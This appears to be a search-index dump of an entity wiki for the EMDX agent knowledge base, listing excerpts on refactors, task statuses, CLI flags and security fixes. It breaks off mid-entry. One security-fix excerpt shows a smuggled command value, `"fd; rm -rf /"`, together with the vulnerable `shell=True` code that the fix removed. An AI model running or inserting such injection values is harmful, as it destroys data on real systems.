EMDX Control Center v5 Implementation   Section: Current Architecture Strengths</p> </li> <li><code>auto_tagger.py</code> - Tag suggestion engine</li> <li><code>execution_monitor.py</code> - Process monitoring</li> <li><code>log_stream.py</code> - Event-driven streaming (not polling!)</li> <li> <p><code>lifecycle_tracker.py</code> - Document lifecycle</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...y**: 5 necessary, 1 borderline (keep)</p> </li> <li>unified_search.py: All 7 necessary</li> <li>auto_tagger.py: All 8 necessary</li> <li>similarity.py: All 2 necessary</li> <li>ask_service.py: All 2 necessary</li> <li>synthesis_service.py: All 2 necessary</li> <li> <p>document_merger.py: A...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>def __init__(\n    self,\n    db_path: Union[str, Path] | None = None,\n    patterns: dict | None = None,\n):\n</code></pre> <p>**Assessment...</p>"},{"location":"entities/autotaggerpy/#auto_taggerpy279-337-batch_suggest-59-lines","title":"auto_tagger.py:279-337 - <code>batch_suggest()</code> (59 lines)","text":"<p>The SQL query building is tangled with business logic.</p>"},{"location":"entities/autotaggerpy/#5-services-layer","title":"5. Services Layer","text":""},{"location":"entities/autotaggerpy/#2-auto_taggerpy106-107-autotagger__init__","title":"2. <code>auto_tagger.py:106-107</code> \u2014 <code>AutoTagger.__init__</code>","text":""},{"location":"entities/autotaggerpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>tag system emojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>subprocess_default_timeout</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>execution_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.5)</li> <li><code>document_merger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> <li><code>cli_executor/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>cli_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/before/","title":"before:","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2025-07-07</p>"},{"location":"entities/before/#documents-12","title":"Documents (12)","text":"<ul> <li>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Phase 1: Critical Fixes (Immediate - 30 minutes) </li> </ul> <pre><code># BEFORE:\nset -l script_dir (dirname (status -f))\n\n- **#6848** Delegate: ARCH-14: Add click as an explicit dependency in pyproject.to [3/4]\n  *Section: Summary*\n  &gt; **Change made:** Updated `pyproject.toml` line 29:\n- **Before:** `click = \"&gt;=8.1.0\"  # Typer 0.15+ requires click 8.1+`\n- **After:** `click = \"&gt;=8.0.0\"  # Typer 0.23+ requires click 8.0+`\n\n- **#6785** Delegate: --help [2/2]\n  *Section: Before vs After*\n  &gt; **Before:** Flat list of 20+ options in plain text, no examples visible, no visual grouping.\n\n- **#6784** Delegate: --help [2/2]\n  *Section: Changes Summary*\n  &gt; ### Before \u2192 After\n- **Before:** Flat list of 20+ options with no grouping, verbose help text, no examples\n- **After:** Organized panels (Options, Git &amp; PRs, Organization, Commands), concise descr...\n\n- **#6405** Bug Fix PR Reviews [4/6]\n  *Section: Security Impact*\n  &gt; - **Before:** Pickle deserialization could execute arbitrary code if cache file was tampered with\n- **After:** JSON and scipy.sparse NPZ are safe formats that cannot execute code\n\n- **#6403** Bug Fix PR Reviews [1/6]\n  *Section: Code Analysis*\n  &gt; ### 1. \u2705 Bug Fix (Masking Clause Removal)\n**Before:** `return cursor.rowcount &gt; 0 or stage is not None`\n**After:** `return cursor.rowcount &gt; 0`\n\n- **#6383** Strategy: EMDX as Agent Workspace\n  *Section: Identity Shift*\n  &gt; **Before:** \"EMDX is a CLI knowledge base and documentation management system.\"\n**After:** \"EMDX is an agent workspace \u2014 a knowledge base that AI agents use to plan, execute, and persist their work, with a human dashboard for oversight.\"\n\n- **#6276** Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands\n  *Section: Security Impact*\n  &gt; **Before:** `emdx delegate --each \"fd; rm -rf /\"` would execute `rm -rf /`\n\n- **#6270** Security Fix: Command Injection in delegate --each\n  *Section: 1. Fixed Command Injection in `_run_discovery()` (CRITICAL)*\n  &gt; **Before:**\n```python\nresult = subprocess.run(\n    command,\n    shell=True,  # DANGEROUS\n    capture_output=True,\n    ...\n)\n</code></pre> <ul> <li>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 2. Clarified Tag Input Format <p>Updated <code>delegate.py</code> help text for <code>--tags</code> option:</p> </li> <li>Before: \"Tags to apply to outputs (comma-separated)\"</li> <li> <p>After: \"Tags to apply to outputs (comma-separated or multiple -t flags)\"</p> </li> <li> <p>#6247 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [13/37]   Section: Changes Made</p> </li> <li>Before: Only Python 3.13</li> <li>After: Python 3.11, 3.12, 3.13</li> <li> <p>Added <code>fail-fast: false</code> to run all matrix jobs even if one fails</p> </li> <li> <p>#6187 Delegate: Fix PR #453 (Ask the KB). Checkout branch feat/ask-kb. Revie [2/2]   Section: 1. DRY Refactoring - _add_filters() helper</p> <p>Before: Filter logic was duplicated in both methods with inline function definition in <code>_retrieve_keyword</code> and direct code in <code>_retrieve_semantic</code>.</p> </li> </ul>"},{"location":"entities/before/#11-fix-dev-installfish-script","title":"1.1 Fix dev-install.fish Script","text":"<p>File: <code>dev-install.fish</code> Problem: Relative path resolution Fix:</p>"},{"location":"entities/before/#1-expanded-python-test-matrix","title":"1. Expanded Python Test Matrix","text":""},{"location":"entities/before/#related-entities","title":"Related Entities","text":"<ul> <li><code>after:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=6.1)</li> <li><code>`emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>task:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>security impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>`emdx/commands/delegate.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>approve</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>rich_markup_mode=\"rich\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>_delegate_help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.3)</li> <li><code>safe_discovery_commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.0)</li> </ul>"},{"location":"entities/best-practices/","title":"best practices","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2025-07-07</p>"},{"location":"entities/best-practices/#documents-10","title":"Documents (10)","text":"<ul> <li>#6472 EMDX Task System: Architecture, Data Model, and Integration <p>Completion: Update with result or error</p> </li> <li>Stats: Track for retry analysis</li> </ul>"},{"location":"entities/best-practices/#key-api-functions","title":"Key API Functions","text":""},{"location":"entities/best-practices/#model-layer-taskspy","title":"Model Layer (tasks.py)","text":"Function Purpose <code>create_task(...)</code> Create with all fields including delegate track... <ul> <li> <p>#6471 iTerm2 Clickable Claude List Implementation Guide</p> <p>For iTerm2 users: <code>fish    # Run this to see setup instructions    setup-claude-iterm-triggers</code></p> </li> <li> <p>For quick access: <code>fish    # Use the cl function for number-based selection    funcsave cl</code></p> </li> </ul>"},{"location":"entities/best-practices/#best-practices_1","title":"Best Practices","text":"<ol> <li> <p>**Use...</p> </li> <li> <p>#6464 Claude Document Templates Comprehensive Guide</p> <p>\"Document this implementation with metadata and testing steps\"</p> </li> <li>\"Analyze the security issues using the standard analysis format\"</li> </ol>"},{"location":"entities/best-practices/#integration-with-claudemd","title":"Integration with CLAUDE.md","text":"<p>Add to your global or project CLAUDE.md:</p> <pre><code>- Always use standardized document templat...\n\n- **#6182** Delegate: analysis,task-system [13/15]\n  &gt; Records errors on failure\n5. Tracks parent-child relationships\n\n## Best Practices\n\n1. **Task Granularity**: Use single for atomic ops, group for parallel independent, chain for sequential dependent\n2.\n\n- **#251** Claude Backup and Restore System\n  &gt; **JSON Lines** (Portable)\n- One document per line\n- Easy to process with other tools\n- Can import to other systems\n\n### 3. **Markdown Export** (Human Readable)\n- One file per document\n- Organized by project\n- Great for Git repos or reading\n\n## Additi...\n\n- **#168** MCP-Playwright Setup Guide\n  &gt; Take screenshot:\n   mcp__playwright__screenshot\n\n4. Save to knowledge base:\n   claude-screenshot saved-screenshot.png \"Page Title\"\n</code></pre>"},{"location":"entities/best-practices/#integration-with-test-automation","title":"Integration with Test Automation","text":""},{"location":"entities/best-practices/#automated-test-recording","title":"Automated Test Recording","text":"<p>Create a Fish function to streamline the pro...</p> <ul> <li>#182 SUBAGENT-FINANCIAL-DATA-GUIDE <p>Process all data types (parallel): 3s</p> </li> <li>Generate report: 2s Total: 7 seconds (59% faster)</li> </ul>"},{"location":"entities/best-practices/#best-practices_2","title":"Best Practices","text":"<ol> <li> <p>Define Clear Boundaries: Each sub-agent should have a specific, well-defined task 2.</p> </li> <li> <p>#186 EMAIL-MANAGEMENT-GUIDES   Section: Security Considerations</p> <p>Best practices:</p> </li> <li>Never forward financial emails to unsecured accounts</li> <li>Use 2FA on your Gmail account</li> <li>Regularly review account access (Settings \u2192 Security)</li> <li> <p>Don't store f...</p> </li> <li> <p>#6663 Prime Command Redesign: External Tool Research [2/4]   Section: Key Takeaways for Comparison with Claude Code</p> <p>...ules Guide \u2014 design.dev](https://design.dev/guides/cursor-rules/)</p> </li> <li>Cursor Rules: Best Practices \u2014 Elementor Engineers</li> <li> <p>[How to Write Great Cursor Rules \u2014 Trigger.d...</p> </li> <li> <p>#20 Document Linking and References Plan   Section: 4. New Commands</p> <p>\ud83d\udce4 This document references:   \u2192 #2105: Claude Interactive Options Summary   \u2192 #2098: FZF Best Practices</p> </li> </ol>"},{"location":"entities/best-practices/#related-entities","title":"Related Entities","text":"<ul> <li><code>monitoring</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>services layer integration points</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>sequential pipeline</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>recovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>models layer commands layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>model layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>log_progress()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/blocked/","title":"blocked","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2025-07-12</p>"},{"location":"entities/blocked/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...| Optional description | | <code>status</code> | TEXT | \"open\" | Current state: open, active, blocked, done, failed | | <code>priority</code> | INTEGER | 3 | Priority level (1=highest, 5=lowest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan) | | `proje...</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Tagging Approach:</p> </li> <li>Passed via <code>--tags</code> flag at creation time</li> <li>Status tags: <code>active</code>, <code>done</code>, <code>blocked</code>, <code>failed</code></li> <li>Content type tags: <code>analysis</code>, <code>gameplan</code>, <code>bugfix</code>, <code>security</code></li> <li> <p>Never applied incrementally \u2014 set once at save time</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...for grouped operations</p> </li> <li>Status workflow: <code>open</code> \u2192 <code>active</code> \u2192 <code>done</code> | <code>failed</code> | <code>blocked</code></li> <li>Priority levels 1-5 with gameplan linkage</li> <li> <p>Fields for delegate activity: <code>prompt</code>, <code>type</code>, <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>seq</code>, <code>retry_of</code>, `...</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: How <code>emdx task run</code> Works</p> <ol> <li>Entry Point: <code>emdx/commands/tasks.py:run()</code> (lines 239-262)</li> </ol> </li> <li>Validates task exists and status is <code>open</code> or <code>blocked</code></li> <li>Checks all dependencies are satisfied</li> <li> <p>Calls <code>run_task()</code> from task_runner service</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task States (STATUSES constant)</p> <p><code>python STATUSES = (\"open\", \"active\", \"blocked\", \"done\", \"failed\")</code></p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: EMDX Task CLI Commands Analysis</p> </li> <li> <p>#452 Minimal Tag Taxonomy - Space-Efficient   Section: Core Tags (Single Words Only)</p> </li> <li><code>active</code> - Currently working on</li> <li><code>done</code> - Completed</li> <li> <p><code>blocked</code> - Stuck/waiting</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Core Workflow Tags</p> <p>...<code>planning</code> - Initial planning phase</p> </li> <li><code>in-progress</code> - Currently being worked on</li> <li><code>blocked</code> - Waiting on external dependencies</li> <li><code>needs-review</code> - Ready for evaluation</li> <li><code>completed</code> - Finished successfully</li> <li> <p><code>abandoned</code> - Discontinued/cancelled</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> <p>...meplan<code>,</code>analysis<code>,</code>todo<code>,</code>in-progress<code>,</code>completed`</p> </li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li> <p><code>priority-high</code>, <code>priority-medium</code>, <code>priority-low</code></p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: How Tasks Are Grouped</p> Section Icon Style READY (open) <code>\u25cb</code> default ACTIVE <code>\u25cf</code> green BLOCKED <code>\u26a0</code> yellow DONE <code>\u2713</code> dim FAILED <code>\u2717</code> red </li> </ul>"},{"location":"entities/blocked/#status-system","title":"Status System","text":"<p>Valid statuses: <code>open</code>, <code>active</code>, <code>blocked</code>, <code>done</code>, <code>failed</code> Icons: \u25cb (open), \u25cf (active), \u26a0 (blocked), \u2713 (done), \u2717 (failed)</p>"},{"location":"entities/blocked/#status-lifecycle","title":"Status (Lifecycle)","text":""},{"location":"entities/blocked/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/task_runner.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>bugfix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>workflow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>urgent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>update_task(id, **kwargs)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type='single'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type='group'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type='chain'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>timestamps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>open</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/branch/","title":"--branch","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-16</p>"},{"location":"entities/branch/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...ext | | <code>--pr</code> | \u2014 | \u2014 | Instruct agent to create a PR (implies <code>--worktree</code>) | | <code>--branch</code> | \u2014 | \u2014 | Commit and push to origin branch (implies <code>--worktree</code>, no PR) | | <code>--draft</code> / <code>--no-draft</code> | \u2014 | \u2014 | Create PR as draft (default: <code>--no-draft</code>) | | `--wo...</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...render nicely in <code>--help</code></p> </li> <li>Grouped option panels \u2014 Git/PR options (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are grouped under \"Git &amp; PRs\", and <code>--epic</code>/<code>--cat</code> under \"Organization\"</li> <li> <p>Concise option descriptions \u2014 Trimmed ver...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>...ode=\"rich\"` on the Typer app</p> </li> <li>Grouped option panels \u2014 Git/PR flags (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are under \"Git &amp; PRs\"; organization flags (<code>--epic</code>, <code>--cat</code>) are under \"Organization\"</li> <li> <p>Concise help strings \u2014 Ever...</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p>...p_mode=\"rich\"` on the Typer app</p> </li> <li>Added <code>rich_help_panel=\"Git &amp; PRs\"</code> for <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>Added <code>rich_help_panel=\"Organization\"</code> for <code>--epic</code>, <code>--cat</code></li> <li> <p>Tightened all option help strings to be more concise</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> <p>...- Grouped options with <code>rich_help_panel</code>:</p> </li> <li>\"Git &amp; PRs\" panel: <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>\"Organization\" panel: <code>--epic</code>, <code>--cat</code></li> <li> <p>Improved option descriptions \u2014 cleaner, more concise text (e.g. \"Inj...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...| 1 | CLI argument parsing &amp; validation | 864\u20131076 | Typer callback: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the entry point...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 5. Git Integration</p> <ul> <li><code>--worktree</code>: Isolated execution environment</li> </ul> </li> <li><code>--branch</code>: Push branch without PR (worktree retained)</li> <li><code>--pr</code>: Create PR after changes (worktree cleaned up)</li> <li><code>--draft</code>: Create as draft PR</li> <li> <p><code>--base-branch</code>: Custom base for worktree</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Git Integration Options</p> <p>...it worktree | | <code>--pr</code> | \u2014 | Create a PR after changes (implies <code>--worktree</code>) | | <code>--branch</code> | \u2014 | Push branch without creating PR (implies <code>--worktree</code>) | | <code>--draft/--no-draft</code> | \u2014 | Create PR as draft (default: False) | | <code>--base-branch</code> | <code>-b</code> | Base br...</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: What Works Well</p> <ol> <li>Worktree Isolation (<code>utils/git.py</code>)</li> </ol> </li> <li>Automatic worktree creation for parallel git work</li> <li>Clean branch naming with collision-resistant hashes</li> <li>Proper cleanup on completion (except <code>--branch</code> mode)</li> </ul>"},{"location":"entities/branch/#related-entities","title":"Related Entities","text":"<ul> <li><code>--base-branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.6)</li> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>grouped option panels</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>--flags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>use sonnet</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>--epic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.0)</li> <li><code>--cat</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.0)</li> <li><code>execution modes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>composability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/browsepy/","title":"browse.py","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2026-01-11</p>"},{"location":"entities/browsepy/#documents-14","title":"Documents (14)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li> <p><code>project: str | None = typer.Option(None, ...)</code> - Legitimate: optional filter</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...| 5 | Yes (new TypedDicts) | | groups.py | 1 | 1 | Yes (DocumentGroup exists) | | browse.py | 1 | 0 | No (local dict conversion) | | core.py | 1 | 0 | No (local list comp) | | review.py | 1 | 0 | No (Any is appropriate for JSON) | | delegate.py | 3 | 0 | No...</p> </li> <li> <p>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588   Section: Detailed Analysis</p> <p>...67 - Command Helpers Refactor</p> </li> <li>Files: 9 (introduces <code>_helpers.py</code>, refactors <code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li>Overlap: 3 files (<code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li> <p>Issue: These 3 command files were modified in #588 for mypy compliance. Re...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...- <code>tags.py</code>: lines 42, 153, 191, 237, 281, 334</p> </li> <li><code>trash.py</code>: lines 56, 106, 165</li> <li><code>browse.py</code>: lines 30, 96, 145</li> <li> <p><code>groups.py</code>: lines 39, 84, 139, 189, 296, 372, 418</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...ces/analysis_service.py<code>| | 7 commands bypass services layer | HIGH |</code>core.py<code>,</code>browse.py<code>,</code>gist.py<code>,</code>groups.py<code>,</code>tags.py<code>,</code>trash.py<code>import</code>database/<code>directly | | 2 layer violations | MEDIUM |</code>database/documents.py<code>imports from</code>models/tags` (upw...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...`) Eager (fast, always loaded):</p> </li> <li><code>core.py</code>: save, find, view, edit, delete</li> <li><code>browse.py</code>: list, recent, stats</li> <li><code>tags.py</code>: tag add/remove/list/rename/merge/batch</li> <li><code>trash.py</code>: trash, restore, purge</li> <li><code>tasks.py</code>: agent work queue with dependencies</li> <li> <p>`gro...</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...operations for documents\" | | <code>trash.py</code> | \"Manage deleted documents (trash)\" | | <code>browse.py</code> | \"Browse and list documents with statistics\" | | <code>gist.py</code> | \"GitHub Gist integration\" | | <code>executions.py</code> | \"Manage and monitor task executions\" | | <code>status.py</code> |...</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 